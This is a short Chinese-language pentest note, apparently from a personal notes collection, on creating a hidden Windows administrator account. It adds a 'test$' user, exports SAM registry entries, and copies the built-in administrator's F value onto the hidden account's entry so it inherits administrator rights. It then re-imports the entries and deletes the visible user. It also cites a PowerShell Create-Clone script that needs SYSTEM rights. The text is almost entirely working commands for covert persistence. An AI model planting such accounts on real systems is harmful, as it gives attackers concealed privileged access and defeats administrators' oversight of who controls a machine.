	>net user test$ test /add
	>net localgroup administrators test$ /add
	注册表HKEY_LOCAL_MACHINE\SAM\SAM\
	给予administrator SAM的完全控制和读取的权限
	以下导出为1.reg
	HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$
	记录HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$的默认类型000003EA
	以下导出为2.reg
	HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA
	默认administrator默认类型为000001F4
	以下导出为3.reg
	HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4
	把000001F4(3.reg)的F值粘贴到000003EA(2.reg)的F值
	修改后导入
	>regedit /s 1.reg
	>regedit /s 2.reg
	删除net user test$ /del
	Powershell脚本
	https://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1
	需system权限
	>Create-Clone -u 要创建的 -p 密码 -cu 想要克隆的
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/448.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/449.png)